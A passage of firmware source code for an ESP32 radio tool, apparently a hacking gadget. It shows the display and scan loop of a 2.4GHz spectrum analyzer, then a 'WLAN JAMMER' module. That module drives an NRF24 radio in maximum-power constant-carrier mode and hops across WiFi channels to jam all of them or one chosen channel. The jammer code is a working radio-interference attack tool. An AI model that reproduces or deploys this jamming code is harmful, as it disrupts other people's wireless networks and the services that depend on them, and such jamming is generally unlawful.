    tft.fillRect(GRAPH_X, WATERFALL_Y, GRAPH_WIDTH, WATERFALL_HEIGHT, TFT_BLACK);

    // Draw skull grid with wave animation
    for (int row = 0; row < SKULL_ROWS; row++) {
        int y = WATERFALL_Y + (row * SKULL_SPACING_Y);

        for (int col = 0; col < SKULL_COLS; col++) {
            int x = GRAPH_X + (col * SKULL_SPACING_X);
            uint8_t level = skull_waterfall[row][col];

            uint16_t color;
            if (level == 0) {
                color = HALEHOUND_GUNMETAL;  // No signal = dark gray
            } else {
                // Apply fade based on row (older = dimmer)
                float rowFade = 1.0f - (row * 0.12f);

                // Wave animation phase - creates pulsing color wave
                int phase = (skullAnimFrame + col + row) % 8;
                float waveBoost = (phase < 4) ? (phase / 4.0f) : ((8 - phase) / 4.0f);

                // Combine signal level with wave animation
                float signalRatio = (float)(level * 2) / 125.0f;
                if (signalRatio > 1.0f) signalRatio = 1.0f;

                // Blend: signal determines base, wave adds shimmer
                float finalRatio = (signalRatio * 0.7f) + (waveBoost * 0.3f);
                finalRatio *= rowFade;
                if (finalRatio > 1.0f) finalRatio = 1.0f;

                // Electric Blue RGB(0, 207, 255) -> Hot Pink RGB(255, 28, 82)
                uint8_t r = (uint8_t)(finalRatio * 255);
                uint8_t g = 207 - (uint8_t)(finalRatio * (207 - 28));
                uint8_t b = 255 - (uint8_t)(finalRatio * (255 - 82));
                color = tft.color565(r, g, b);
            }

            // Cycle through all 8 skull types left to right
            const unsigned char* skullIcon = skullTypes[col % numSkullTypes];
            tft.drawBitmap(x, y, skullIcon, SKULL_SIZE, SKULL_SIZE, color);
        }
    }
    skullAnimFrame++;  // Advance animation
}

static void drawWiFiMarkers() {
    int x1 = GRAPH_X + (WIFI_CH1 * GRAPH_WIDTH / ANA_CHANNELS);
    int x6 = GRAPH_X + (WIFI_CH6 * GRAPH_WIDTH / ANA_CHANNELS);
    int x11 = GRAPH_X + (WIFI_CH11 * GRAPH_WIDTH / ANA_CHANNELS);
    int x13 = GRAPH_X + (WIFI_CH13 * GRAPH_WIDTH / ANA_CHANNELS);

    for (int y = GRAPH_Y; y < GRAPH_Y + GRAPH_HEIGHT; y += 4) {
        tft.drawPixel(x1, y, HALEHOUND_HOTPINK);
        tft.drawPixel(x6, y, HALEHOUND_HOTPINK);
        tft.drawPixel(x11, y, HALEHOUND_HOTPINK);
        tft.drawPixel(x13, y, HALEHOUND_VIOLET);
    }

    // Labels
    tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
    tft.setTextSize(1);
    tft.setCursor(x1 - 4, GRAPH_Y - 10);
    tft.print("1");
    tft.setCursor(x6 - 4, GRAPH_Y - 10);
    tft.print("6");
    tft.setCursor(x11 - 8, GRAPH_Y - 10);
    tft.print("11");
    tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
    tft.setCursor(x13 - 8, GRAPH_Y - 10);
    tft.print("13");
}

static void drawAxes() {
    tft.drawLine(GRAPH_X - 2, GRAPH_Y, GRAPH_X - 2, GRAPH_Y + GRAPH_HEIGHT, HALEHOUND_MAGENTA);
    tft.drawLine(GRAPH_X, GRAPH_Y + GRAPH_HEIGHT, GRAPH_X + GRAPH_WIDTH, GRAPH_Y + GRAPH_HEIGHT, HALEHOUND_MAGENTA);

    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setTextSize(1);
    tft.setCursor(GRAPH_X - 5, GRAPH_Y + GRAPH_HEIGHT + 3);
    tft.print("2400");
    tft.setCursor(GRAPH_X + GRAPH_WIDTH/2 - 15, GRAPH_Y + GRAPH_HEIGHT + 3);
    tft.print("2442");
    tft.setCursor(GRAPH_X + GRAPH_WIDTH - 25, GRAPH_Y + GRAPH_HEIGHT + 3);
    tft.print("2484");

    tft.drawLine(0, WATERFALL_Y - 2, SCREEN_WIDTH, WATERFALL_Y - 2, HALEHOUND_HOTPINK);
}

// Get bar color - matches Scanner style (teal to hot pink gradient)
static uint16_t getAnalyzerBarColor(int height, int maxHeight) {
    float ratio = (float)height / (float)maxHeight;
    if (ratio > 1.0f) ratio = 1.0f;

    // Teal RGB(0, 207, 255) -> Hot Pink RGB(255, 28, 82)
    uint8_t r = 0 + (uint8_t)(ratio * 255);
    uint8_t g = 207 - (uint8_t)(ratio * (207 - 28));
    uint8_t b = 255 - (uint8_t)(ratio * (255 - 82));

    return tft.color565(r, g, b);
}

static void drawSpectrum() {
    tft.fillRect(GRAPH_X, GRAPH_Y, GRAPH_WIDTH, GRAPH_HEIGHT, TFT_BLACK);
    drawWiFiMarkers();

    for (int i = 0; i < ANA_CHANNELS; i++) {
        int x = GRAPH_X + (i * GRAPH_WIDTH / ANA_CHANNELS);

        // Use peak_levels for sticky bars - SAME SCALING AS SCANNER
        int barH = (peak_levels[i] * GRAPH_HEIGHT) / 125;
        if (barH > GRAPH_HEIGHT) barH = GRAPH_HEIGHT;
        if (barH < 4 && peak_levels[i] > 0) barH = 4;

        if (barH > 0) {
            int barY = GRAPH_Y + GRAPH_HEIGHT - barH;

            // Gradient bar - MATCHES SCANNER STYLE
            for (int y = 0; y < barH; y++) {
                uint16_t color = getAnalyzerBarColor(y, GRAPH_HEIGHT);
                tft.drawFastHLine(x, barY + barH - 1 - y, 2, color);
            }
        }
    }
    // Skulls drawn separately in loop for performance
}

static void scanAllChannels() {
    // Persistent channel values - same smoothing as Scanner
    static uint8_t channel[ANA_CHANNELS] = {0};

    // Single pass scan with exponential smoothing - MATCHES SCANNER
    for (int ch = 0; ch < ANA_CHANNELS && analyzerRunning && !exitRequested; ch++) {
        nrfSetChannel(ch);
        nrfSetRX();
        delayMicroseconds(50);
        nrfDisable();

        int rpd = nrfCarrierDetected() ? 1 : 0;
        // Exponential smoothing: 50% old + 50% new (scaled to 125) - SAME AS SCANNER
        channel[ch] = (channel[ch] + rpd * 125) / 2;
    }

    // Check touch for exit
    uint16_t tx, ty;
    if (getTouchPoint(&tx, &ty) && tx < 40 && ty >= ICON_BAR_TOUCH_TOP && ty <= ICON_BAR_TOUCH_BOTTOM) {
        exitRequested = true;
    }

    // Copy smoothed values to peak_levels for display
    for (int i = 0; i < ANA_CHANNELS; i++) {
        peak_levels[i] = channel[i];
    }

    // NOTE: Mid-scan touch check removed — Core 0 must never touch the touchscreen.
    // Exit is handled by Core 1 via analyzerLoop() touch/button checks.
}

static void resetPeaks() {
    memset(peak_levels, 0, sizeof(peak_levels));
    clearSkullWaterfall();
}

// ═══════════════════════════════════════════════════════════════════════════
// DUAL-CORE ANALYZER — FreeRTOS task on Core 0
// Same architecture as Scanner scanTask and SubGHz Analyzer (saScanTask)
// Core 0 = scan, Core 1 = display + touch
// ═══════════════════════════════════════════════════════════════════════════

static void anaTask(void* param) {
    // Reinit SPI on Core 0 — take ownership from Core 1
    SPI.end();
    delay(5);
    SPI.begin(18, 19, 23);  // SCK, MISO, MOSI — manual CS via digitalWrite
    SPI.setFrequency(8000000);

    // Reinit NRF24 registers on Core 0
    nrfPowerUp();
    nrfSetRegister(_NRF24_EN_AA, 0x00);       // Disable auto-ack
    nrfSetRegister(_NRF24_RF_SETUP, 0x0F);    // 2Mbps, max power

    #if CYD_DEBUG
    Serial.println("[ANALYZER] Core 0: Analyze task started");
    #endif

    while (anaTaskRunning) {
        if (anaFrameReady) {
            // Core 1 hasn't consumed the last frame yet — wait
            vTaskDelay(1);
            continue;
        }

        if (analyzerRunning) {
            // Single pass scan with exponential smoothing — matches original scanAllChannels()
            for (int ch = 0; ch < ANA_CHANNELS; ch++) {
                if (!anaTaskRunning) break;
                nrfSetChannel(ch);
                nrfSetRX();
                delayMicroseconds(50);  // Keep existing dwell — RPD accuracy fix is separate
                nrfDisable();

                int rpd = nrfCarrierDetected() ? 1 : 0;
                // Exponential smoothing: 50% old + 50% new (scaled to 125) — SAME AS SCANNER
                anaChannel[ch] = (anaChannel[ch] + rpd * 125) / 2;
            }

            // Copy smoothed values to display array and signal Core 1
            memcpy(peak_levels, anaChannel, ANA_CHANNELS);
            anaFrameReady = true;
        } else {
            vTaskDelay(20);  // Paused (start/stop toggle) — idle
        }
    }

    // Cleanup — power down radio and release SPI
    nrfPowerDown();
    SPI.end();

    #if CYD_DEBUG
    Serial.println("[ANALYZER] Core 0: Analyze task exiting");
    #endif

    anaTaskHandle = NULL;
    anaTaskDone = true;
    vTaskDelete(NULL);
}

static void startAnaTask() {
    if (anaTaskHandle != NULL) return;  // Already running
    anaTaskRunning = true;
    anaTaskDone = false;
    anaFrameReady = false;
    BaseType_t ret = xTaskCreatePinnedToCore(anaTask, "NrfAnalyze", 4096, NULL, 1, &anaTaskHandle, 0);
    #if CYD_DEBUG
    Serial.printf("[ANALYZER] Task create %s (heap=%d)\n",
                  ret == pdPASS ? "OK" : "FAILED", ESP.getFreeHeap());
    #endif
    if (ret != pdPASS) {
        anaTaskHandle = NULL;
        anaTaskRunning = false;
    }
}

static void stopAnaTask() {
    if (anaTaskHandle == NULL) return;  // Not running
    anaTaskRunning = false;
    // Wait up to 500ms for task to self-terminate — NO force-delete EVER
    unsigned long start = millis();
    while (!anaTaskDone && millis() - start < 500) {
        delay(10);
    }
    anaTaskHandle = NULL;
}

static void drawStatusArea() {
    int statusY = WATERFALL_Y + WATERFALL_HEIGHT + 4;
    tft.fillRect(0, statusY, SCREEN_WIDTH, 20, TFT_BLACK);

    int peakCh = 0;
    uint8_t peakVal = 0;
    for (int i = 0; i < ANA_CHANNELS; i++) {
        if (peak_levels[i] > peakVal) {
            peakVal = peak_levels[i];
            peakCh = i;
        }
    }

    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setTextSize(1);
    tft.setCursor(5, statusY + 5);
    tft.printf("Peak:%dMHz Lv:%d", 2400 + peakCh, peakVal);
}

void analyzerSetup() {
    exitRequested = false;
    analyzerRunning = true;
    nrfAnimState = 0;
    nrfActiveIcon = -1;

    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();

    // Title
    tft.fillRect(0, ICON_BAR_Y, SCALE_X(200), ICON_BAR_H, HALEHOUND_GUNMETAL);
    tft.setTextColor(HALEHOUND_MAGENTA);
    tft.setTextSize(1);
    tft.setCursor(SCALE_X(25), ICON_BAR_Y + 4);
    tft.print("2.4GHz SPECTRUM ANALYZER");

    drawNrfIconBar();

    if (!nrfInit()) {
        tft.setTextColor(HALEHOUND_HOTPINK);
        tft.setTextSize(2);
        drawCenteredText(100, "NRF24 NOT FOUND", HALEHOUND_HOTPINK, 2);
        tft.setTextSize(1);
        drawCenteredText(130, "Check wiring:", HALEHOUND_MAGENTA, 1);
        drawCenteredText(145, ("CE=GPIO" + String(NRF24_CE) + " CSN=GPIO" + String(NRF24_CSN)).c_str(), HALEHOUND_MAGENTA, 1);
        return;
    }

    waterfall_initialized = true;
    memset(current_levels, 0, sizeof(current_levels));
    memset(peak_levels, 0, sizeof(peak_levels));
    clearSkullWaterfall();

    drawAxes();
    lastSkullTime = millis();
    skullAnimFrame = 0;
    memset(anaChannel, 0, sizeof(anaChannel));
    startAnaTask();

    #if CYD_DEBUG
    Serial.println("[ANALYZER] NRF24 initialized successfully");
    #endif
}

void analyzerLoop() {
    // Touch uses software bit-banged SPI - no conflict with NRF24 on hardware VSPI

    if (!waterfall_initialized) {
        touchButtonsUpdate();
        uint16_t tx, ty;
        if (getTouchPoint(&tx, &ty) || buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
            exitRequested = true;
        }
        return;
    }

    touchButtonsUpdate();

    // Direct touch check - no animation delay
    uint16_t tx, ty;
    if (getTouchPoint(&tx, &ty)) {
        if (ty >= ICON_BAR_TOUCH_TOP && ty <= ICON_BAR_TOUCH_BOTTOM) {
            // Back icon (x=10)
            if (tx < 40) {
                exitRequested = true;
                return;
            }
            // Reset peaks icon
            if (tx >= nrfIconX[0] - 10 && tx < nrfIconX[0] + NRF_ICON_SIZE + 10) {
                stopAnaTask();  // Stop Core 0 task — releases SPI
                waitForTouchRelease();
                delay(200);
                // Reset all data and redraw statics
                resetPeaks();
                memset(anaChannel, 0, sizeof(anaChannel));
                tft.fillRect(GRAPH_X, GRAPH_Y, GRAPH_WIDTH, GRAPH_HEIGHT, TFT_BLACK);
                tft.fillRect(GRAPH_X, WATERFALL_Y, GRAPH_WIDTH, WATERFALL_HEIGHT, TFT_BLACK);
                drawAxes();
                startAnaTask();  // Restart Core 0 scan
                return;
            }
            // Start/Stop icon
            if (tx >= nrfIconX[1] - 10) {
                // Wait for touch release
                waitForTouchRelease();
                delay(200);
                // Toggle scanning
                analyzerRunning = !analyzerRunning;
                return;
            }
        }
    }

    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
        exitRequested = true;
        return;
    }

    // CONSUMER: draw when Core 0 delivers new scan data
    if (anaFrameReady && analyzerRunning) {
        drawSpectrum();
        anaFrameReady = false;  // Release Core 0 for next scan pass
    }

    // Skulls draw every 100ms - saves performance
    if (millis() - lastSkullTime >= 100) {
        updateSkullWaterfall();
        drawSkullWaterfall();
        drawStatusArea();
        lastSkullTime = millis();
    }
}

bool isExitRequested() {
    return exitRequested;
}

void cleanup() {
    bool hadTask = (anaTaskHandle != NULL);
    stopAnaTask();  // Task handles nrfPowerDown() + SPI.end()
    if (!hadTask) {
        nrfPowerDown();  // No task was running — power down directly
    }
    analyzerRunning = false;
    exitRequested = false;
    waterfall_initialized = false;
}

}  // namespace Analyzer


// ═══════════════════════════════════════════════════════════════════════════
// WLAN JAMMER - WiFi Channel Jammer
// ═══════════════════════════════════════════════════════════════════════════

namespace WLANJammer {

// WiFi channel mapping to NRF24 channels
static const uint8_t WIFI_CH_START[] = {1, 6, 11, 16, 21, 26, 31, 36, 41, 46, 51, 56, 61};
static const uint8_t WIFI_CH_END[] =   {23, 28, 33, 38, 43, 48, 53, 58, 63, 68, 73, 78, 83};
static const uint8_t WIFI_CH_CENTER[] = {12, 17, 22, 27, 32, 37, 42, 47, 52, 57, 62, 67, 72};

#define NUM_WIFI_CHANNELS 13
#define ALL_CHANNELS_MODE 0

// Display constants - INSANE EQUALIZER MODE
#define JAM_GRAPH_X 2
#define JAM_GRAPH_Y SCALE_Y(95)
#define JAM_GRAPH_WIDTH GRAPH_FULL_W
#define JAM_GRAPH_HEIGHT SCALE_Y(140)
#define JAM_NUM_BARS 85    // One bar per NRF channel (0-84 = WiFi range)

// Skull row for jammer feedback
#define JAM_SKULL_Y SCALE_Y(250)
#define JAM_SKULL_NUM 8

static volatile bool jammerActive = false;
static int currentWiFiChannel = ALL_CHANNELS_MODE;
static volatile int currentNRFChannel = 0;
static unsigned long lastDisplayTime = 0;
static bool exitRequested = false;
static bool uiInitialized = false;

static const int HOP_DELAY_US = 500;

static uint8_t signalLevels[13] = {0};
static int jamSkullFrame = 0;
static uint8_t channelHeat[JAM_NUM_BARS] = {0};  // Heat level for each NRF channel - EQUALIZER MODE!

// ═══════════════════════════════════════════════════════════════════════════
// DUAL-CORE JAMMER — FreeRTOS task on Core 0
// Same architecture as BLE Jammer & ProtoKill
// ═══════════════════════════════════════════════════════════════════════════
static TaskHandle_t wlanJamTaskHandle = NULL;
static volatile bool wlanJamTaskRunning = false;
static volatile bool wlanJamTaskDone = false;
static volatile int wlanJamChannel = ALL_CHANNELS_MODE;  // shadow of currentWiFiChannel

static void wlanJamTask(void* param) {
    // ALL SPI + NRF24 operations on core 0
    SPI.end();
    delay(2);
    SPI.begin(RADIO_SPI_SCK, RADIO_SPI_MISO, RADIO_SPI_MOSI, NRF24_CSN);
    delay(5);

    if (!nrf24Radio.begin()) {
        Serial.println("[WLANJAMMER] Core 0: NRF24 begin() FAILED");
        wlanJamTaskDone = true;
        vTaskDelete(NULL);
        return;
    }

    // startConstCarrier — continuous wave, 100% duty cycle
    nrf24Radio.stopListening();
    nrf24Radio.setPALevel(RF24_PA_MAX);
    nrf24Radio.startConstCarrier(RF24_PA_MAX, 50);
    nrf24Radio.setAddressWidth(5);
    nrf24Radio.setPayloadSize(2);
    nrf24Radio.setDataRate(RF24_2MBPS);

    Serial.printf("[WLANJAMMER] Core 0: CW carrier active, isPVariant=%d\n",
                  nrf24Radio.isPVariant());

    int localHop = 1;
    int yieldCounter = 0;

    while (wlanJamTaskRunning) {
        int wifiCh = wlanJamChannel;

        localHop++;
        if (wifiCh == ALL_CHANNELS_MODE) {
            if (localHop > 83) localHop = 1;
        } else {
            if (localHop > WIFI_CH_END[wifiCh - 1] || localHop < WIFI_CH_START[wifiCh - 1]) {
                localHop = WIFI_CH_START[wifiCh - 1];
            }
        }

        nrf24Radio.setChannel(localHop);
        delayMicroseconds(HOP_DELAY_US);

        // Update shared state for display
        currentNRFChannel = localHop;

        // Feed watchdog
        yieldCounter++;
        if (yieldCounter >= 100) {
            yieldCounter = 0;
            vTaskDelay(1);
        }
    }

    // Cleanup on core 0 — full chip reinit required!
    // startConstCarrier() calls disableCRC(), setAutoAck(0), setRetries(0,0),
    // reUseTX(), and sets CONT_WAVE/PLL_LOCK test mode bits.
    // stopConstCarrier() only partially cleans up (never re-enables CRC).
    // begin() reinitializes ALL registers to known defaults.
    nrf24Radio.stopConstCarrier();
    nrf24Radio.begin();       // Full chip reinit — restores CRC, auto-ack, all registers
    nrf24Radio.powerDown();
    SPI.end();

    Serial.println("[WLANJAMMER] Core 0: Radio fully reset + powered down, SPI released");
    wlanJamTaskDone = true;
    vTaskDelete(NULL);
}

// Skull icons for jammer display
static const unsigned char* jamSkulls[] = {
    bitmap_icon_skull_wifi,
    bitmap_icon_skull_bluetooth,
    bitmap_icon_skull_jammer,
    bitmap_icon_skull_subghz,
    bitmap_icon_skull_ir,
    bitmap_icon_skull_tools,
    bitmap_icon_skull_setting,
    bitmap_icon_skull_about
};

// Icon bar for jammer - uses start/stop icon
#define JAM_ICON_NUM 3
static int jamIconX[JAM_ICON_NUM] = {SCALE_X(90), SCALE_X(170), 10};
static const unsigned char* jamIcons[JAM_ICON_NUM] = {
    bitmap_icon_start,     // Toggle ON/OFF
    bitmap_icon_RIGHT,     // Next channel
    bitmap_icon_go_back    // Back
};

static int jamActiveIcon = -1;
static int jamAnimState = 0;
static unsigned long jamLastAnim = 0;

static void drawJamIconBar() {
    tft.drawLine(0, ICON_BAR_TOP, SCREEN_WIDTH, ICON_BAR_TOP, HALEHOUND_MAGENTA);
    tft.fillRect(0, ICON_BAR_Y, SCREEN_WIDTH, ICON_BAR_H, HALEHOUND_GUNMETAL);
    for (int i = 0; i < JAM_ICON_NUM; i++) {
        if (jamIcons[i] != NULL) {
            tft.drawBitmap(jamIconX[i], ICON_BAR_Y, jamIcons[i], 16, 16, HALEHOUND_MAGENTA);
        }
    }
    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, HALEHOUND_HOTPINK);
}

static int checkJamIconTouch() {
    uint16_t tx, ty;
    if (getTouchPoint(&tx, &ty)) {
        if (ty >= ICON_BAR_TOUCH_TOP && ty <= ICON_BAR_TOUCH_BOTTOM) {
            for (int i = 0; i < JAM_ICON_NUM; i++) {
                if (tx >= jamIconX[i] - 5 && tx <= jamIconX[i] + 21) {
                    if (jamAnimState == 0) {
                        tft.drawBitmap(jamIconX[i], ICON_BAR_Y, jamIcons[i], 16, 16, TFT_BLACK);
                        jamAnimState = 1;
                        jamActiveIcon = i;
                        jamLastAnim = millis();
                    }
                    return i;
                }
            }
        }
    }
    return -1;
}

static int processJamIconAnim() {
    if (jamAnimState > 0 && millis() - jamLastAnim >= 50) {
        if (jamAnimState == 1) {
            tft.drawBitmap(jamIconX[jamActiveIcon], ICON_BAR_Y, jamIcons[jamActiveIcon], 16, 16, HALEHOUND_MAGENTA);
            jamAnimState = 2;
            int action = jamActiveIcon;
            jamLastAnim = millis();
            return action;
        } else if (jamAnimState == 2) {
            jamAnimState = 0;
            jamActiveIcon = -1;
        }
    }
    return -1;
}

// Old raw SPI functions removed — dual-core task handles all radio ops on core 0

static void drawHeader() {
    tft.fillRect(0, CONTENT_Y_START, SCREEN_WIDTH, SCALE_Y(50), TFT_BLACK);

    drawGlitchText(SCALE_Y(55), "WLAN JAMMER", &Nosifer_Regular10pt7b);

    if (jammerActive) {
        drawGlitchStatus(SCALE_Y(72), "JAMMING", HALEHOUND_HOTPINK);
    } else {
        drawGlitchStatus(SCALE_Y(72), "STANDBY", HALEHOUND_GUNMETAL);
    }

    tft.setTextColor(HALEHOUND_MAGENTA, TFT_BLACK);
    tft.setCursor(10, SCALE_Y(70));
    if (currentWiFiChannel == ALL_CHANNELS_MODE) {
        tft.print("Mode: ALL WiFi Channels (1-13)");
    } else {
        int freq = 2407 + (currentWiFiChannel * 5);
        tft.printf("Mode: WiFi Ch %d (%d MHz)", currentWiFiChannel, freq);
    }

    tft.drawLine(0, SCALE_Y(85), SCREEN_WIDTH, SCALE_Y(85), HALEHOUND_HOTPINK);
}

static void drawChannelDisplay() {
    int channelY = SCALE_Y(90);
    tft.fillRect(JAM_GRAPH_X, channelY, JAM_GRAPH_WIDTH, 15, TFT_BLACK);

    tft.setTextSize(1);
    for (int ch = 1; ch <= 13; ch++) {
        int x = JAM_GRAPH_X + ((ch - 1) * JAM_GRAPH_WIDTH / 13);

        if (currentWiFiChannel == ALL_CHANNELS_MODE || currentWiFiChannel == ch) {
            if (jammerActive) {
                tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
            } else {
                tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
            }
        } else {
            tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
        }

        tft.setCursor(x + 2, channelY);
        if (ch < 10) {
            tft.printf(" %d", ch);
        } else {
            tft.printf("%d", ch);
        }
    }
}

// Forward declaration
static void drawJammerWiFiMarkers();

// Update channel heat levels - EQUALIZER MODE (85 bars!)
static void updateChannelHeat() {
    if (!jammerActive) {
        // Decay all channels when not jamming
        for (int i = 0; i < JAM_NUM_BARS; i++) {
            if (channelHeat[i] > 0) {
                channelHeat[i] = channelHeat[i] / 2;  // Fast decay when stopped
            }
        }
        return;
    }

    if (currentWiFiChannel == ALL_CHANNELS_MODE) {
        // ALL CHANNELS MODE - INSANE EQUALIZER
        // All bars dance because we're jamming EVERYTHING
        for (int i = 0; i < JAM_NUM_BARS; i++) {
            int dist = abs(i - currentNRFChannel);

            if (i == currentNRFChannel) {
                // Direct hit - MAX HEAT
                channelHeat[i] = 125;
            } else if (dist <= 6) {
                // Splash zone - strong heat with falloff
                int splash = 110 - (dist * 12);
                channelHeat[i] = (channelHeat[i] + splash) / 2;
            } else {
                // Background chaos - all bars dance randomly
                // Base 50-80 with random variation = visible activity everywhere
                int chaos = 50 + random(40);
                channelHeat[i] = (channelHeat[i] + chaos) / 2;
            }
        }
    } else {
        // SINGLE CHANNEL MODE - focused attack
        int startCh = WIFI_CH_START[currentWiFiChannel - 1];
        int endCh = WIFI_CH_END[currentWiFiChannel - 1];

        for (int i = 0; i < JAM_NUM_BARS; i++) {
            bool isTargeted = (i >= startCh && i <= endCh);
            bool isCurrentChannel = (i == currentNRFChannel);

            if (isCurrentChannel) {
                // Currently being hit - MAX HEAT
                channelHeat[i] = 125;
            } else if (isTargeted) {
                // In target range - keep warm with variation
                int baseHeat = 50 + random(30);
                int dist = abs(i - currentNRFChannel);
                int neighborBoost = (dist <= 2) ? (30 - dist * 10) : 0;
                int targetHeat = baseHeat + neighborBoost;
                channelHeat[i] = (channelHeat[i] + targetHeat) / 2;
            } else {
                // Not targeted - decay
                if (channelHeat[i] > 0) {
                    channelHeat[i] = (channelHeat[i] * 3) / 4;
                }
            }
        }
    }
}

static void drawJammerDisplay() {
    // Update heat levels first
    updateChannelHeat();

    // Clear display area
    tft.fillRect(JAM_GRAPH_X, JAM_GRAPH_Y, JAM_GRAPH_WIDTH, JAM_GRAPH_HEIGHT, TFT_BLACK);

    // Draw frame
    tft.drawRect(JAM_GRAPH_X - 1, JAM_GRAPH_Y - 1, JAM_GRAPH_WIDTH + 2, JAM_GRAPH_HEIGHT + 2, HALEHOUND_MAGENTA);

    int maxBarH = JAM_GRAPH_HEIGHT - 25;

    if (!jammerActive) {
        // Check if any heat remains (for decay animation)
        bool hasHeat = false;
        for (int i = 0; i < JAM_NUM_BARS; i++) {
            if (channelHeat[i] > 3) { hasHeat = true; break; }
        }

        if (!hasHeat) {
            // Fully stopped - show standby bars
            for (int i = 0; i < JAM_NUM_BARS; i++) {
                int x = JAM_GRAPH_X + (i * JAM_GRAPH_WIDTH / JAM_NUM_BARS);
                int barH = 8 + (i % 5) * 2;  // Slight variation
                int barY = JAM_GRAPH_Y + JAM_GRAPH_HEIGHT - barH - 10;
                tft.drawFastVLine(x, barY, barH, HALEHOUND_GUNMETAL);
                tft.drawFastVLine(x + 1, barY, barH, HALEHOUND_GUNMETAL);
            }

            // Standby text
            tft.setTextColor(HALEHOUND_GUNMETAL, TFT_BLACK);
            tft.setTextSize(1);
            tft.setCursor(JAM_GRAPH_X + 85, JAM_GRAPH_Y + 5);
            tft.print("STANDBY");

            // WiFi channel markers
            drawJammerWiFiMarkers();
            return;
        }
    }

    // DRAW THE EQUALIZER - 85 skinny bars of FIRE!
    for (int i = 0; i < JAM_NUM_BARS; i++) {
        int x = JAM_GRAPH_X + (i * JAM_GRAPH_WIDTH / JAM_NUM_BARS);
        uint8_t heat = channelHeat[i];

        // Bar height based on heat - MORE AGGRESSIVE scaling
        int barH = (heat * maxBarH) / 100;  // Taller bars!
        if (barH > maxBarH) barH = maxBarH;
        if (barH < 8) barH = 8;  // Higher minimum

        int barY = JAM_GRAPH_Y + JAM_GRAPH_HEIGHT - barH - 8;

        // Color based on heat - vibrant gradient from cyan to hot pink
        for (int y = 0; y < barH; y++) {
            float heightRatio = (float)y / (float)barH;
            float heatRatio = (float)heat / 125.0f;

            // More aggressive color gradient
            float ratio = heightRatio * (0.3f + heatRatio * 0.7f);
            if (ratio > 1.0f) ratio = 1.0f;

            // Cyan (0, 207, 255) -> Hot Pink (255, 28, 82)
            uint8_t r = (uint8_t)(ratio * 255);
            uint8_t g = 207 - (uint8_t)(ratio * (207 - 28));
            uint8_t b = 255 - (uint8_t)(ratio * (255 - 82));
            uint16_t color = tft.color565(r, g, b);

            tft.drawFastHLine(x, barY + barH - 1 - y, 2, color);
        }

        // Add glow effect at base for hot bars
        if (heat > 80) {
            tft.drawFastHLine(x, barY + barH, 2, HALEHOUND_HOTPINK);
            tft.drawFastHLine(x, barY + barH + 1, 2, tft.color565(128, 14, 41));
        }
    }

    // WiFi channel markers
    drawJammerWiFiMarkers();

    // Current frequency display
    if (jammerActive) {
        tft.fillRect(JAM_GRAPH_X + 50, JAM_GRAPH_Y + 2, 140, 12, TFT_BLACK);
        tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
        tft.setTextSize(1);
        tft.setCursor(JAM_GRAPH_X + 55, JAM_GRAPH_Y + 3);
        tft.printf(">>> %d MHz <<<", 2400 + currentNRFChannel);
    }
}

// Draw WiFi channel markers below the equalizer
static void drawJammerWiFiMarkers() {
    int markerY = JAM_GRAPH_Y + JAM_GRAPH_HEIGHT - 8;

    // Draw markers for channels 1, 6, 11, 13
    int x1 = JAM_GRAPH_X + (12 * JAM_GRAPH_WIDTH / JAM_NUM_BARS);
    int x6 = JAM_GRAPH_X + (37 * JAM_GRAPH_WIDTH / JAM_NUM_BARS);
    int x11 = JAM_GRAPH_X + (62 * JAM_GRAPH_WIDTH / JAM_NUM_BARS);
    int x13 = JAM_GRAPH_X + (72 * JAM_GRAPH_WIDTH / JAM_NUM_BARS);

    tft.setTextColor(HALEHOUND_HOTPINK, TFT_BLACK);
    tft.setTextSize(1);
    tft.setCursor(x1 - 2, markerY);
    tft.print("1");
    tft.setCursor(x6 - 2, markerY);
    tft.print("6");
    tft.setCursor(x11 - 4, markerY);
    tft.print("11");
    tft.setTextColor(HALEHOUND_VIOLET, TFT_BLACK);
    tft.setCursor(x13 - 4, markerY);
    tft.print("13");
}

static void drawJammerSkulls() {
    // Skull row at bottom - visual feedback
    int skullStartX = 10;
    int skullSpacing = SCALE_X(28);

    for (int i = 0; i < JAM_SKULL_NUM; i++) {
        int x = skullStartX + (i * skullSpacing);
        tft.fillRect(x, JAM_SKULL_Y, 16, 16, TFT_BLACK);

        uint16_t color;
        if (jammerActive) {
            // Animated wave when jamming - hot pink to cyan
            int phase = (jamSkullFrame + i) % 8;
            if (phase < 4) {
                float ratio = phase / 3.0f;
                uint8_t r = (uint8_t)(ratio * 255);
                uint8_t g = 207 - (uint8_t)(ratio * (207 - 28));
                uint8_t b = 255 - (uint8_t)(ratio * (255 - 82));
                color = tft.color565(r, g, b);
            } else {
                float ratio = (phase - 4) / 3.0f;
                uint8_t r = 255 - (uint8_t)(ratio * 255);
                uint8_t g = 28 + (uint8_t)(ratio * (207 - 28));
                uint8_t b = 82 + (uint8_t)(ratio * (255 - 82));
                color = tft.color565(r, g, b);
            }
        } else {
            color = HALEHOUND_GUNMETAL;  // Gray when inactive
        }

        tft.drawBitmap(x, JAM_SKULL_Y, jamSkulls[i], 16, 16, color);
    }

    // Status text next to skulls
    tft.fillRect(skullStartX + (JAM_SKULL_NUM * skullSpacing), JAM_SKULL_Y, 50, 16, TFT_BLACK);
    tft.setTextColor(jammerActive ? HALEHOUND_HOTPINK : HALEHOUND_GUNMETAL, TFT_BLACK);
    tft.setTextSize(1);
    tft.setCursor(skullStartX + (JAM_SKULL_NUM * skullSpacing) + 5, JAM_SKULL_Y + 4);
    tft.print(jammerActive ? "TX!" : "OFF");

    jamSkullFrame++;
}

static void startJamming() {
    wlanJamChannel = currentWiFiChannel;
    wlanJamTaskDone = false;
    jammerActive = true;

    wlanJamTaskRunning = true;
